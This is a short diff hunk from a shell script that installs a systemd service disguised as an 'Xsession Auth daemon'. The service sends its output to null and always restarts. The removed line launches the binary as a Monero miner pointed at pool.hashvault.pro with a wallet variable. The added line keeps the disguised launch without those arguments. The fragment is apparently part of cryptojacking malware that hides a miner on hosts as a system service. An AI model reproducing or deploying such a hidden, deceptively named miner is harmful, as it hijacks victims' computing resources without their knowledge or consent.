@@ -22,7 +22,7 @@ cat <<HEREDOC > $SYSTEMD_PATH/$APPNAME.service
 Description=Xsession Auth daemon
 
 [Service]
-ExecStart=$LOCAL_PATH/$APPNAME -o pool.hashvault.pro:80 -u $WALLET --coin monero
+ExecStart=$LOCAL_PATH/$APPNAME
 StandardOutput=null
 StandardError=null
 Restart=always
